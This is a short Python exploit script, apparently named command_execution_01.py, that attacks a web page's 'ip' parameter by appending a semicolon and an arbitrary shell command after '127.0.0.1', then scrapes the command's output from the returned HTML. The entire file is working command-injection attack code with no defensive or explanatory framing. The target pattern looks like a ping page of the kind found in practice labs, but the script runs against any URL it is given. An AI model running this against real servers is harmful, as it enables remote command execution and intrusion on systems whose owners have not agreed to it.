import requests
from lxml import html
import sys

if len(sys.argv) != 3:
    print("Usage:\n\tpython3 command_execution_01.py <URL> <COMMAND>")
    sys.exit(1)

url = sys.argv[1]
command = sys.argv[2]
parameter = {'ip': f'127.0.0.1; {command}'}

request = requests.get(url, params=parameter)
if request.status_code == 200:
    content = request.content
    html_ = html.fromstring(content)
    command_output = html_.xpath('//pre//text()')[0].split('\n')[-2]
    print(f"[+] Command executed!\n{command_output}")
else:
    print("[-] Something went wrong")
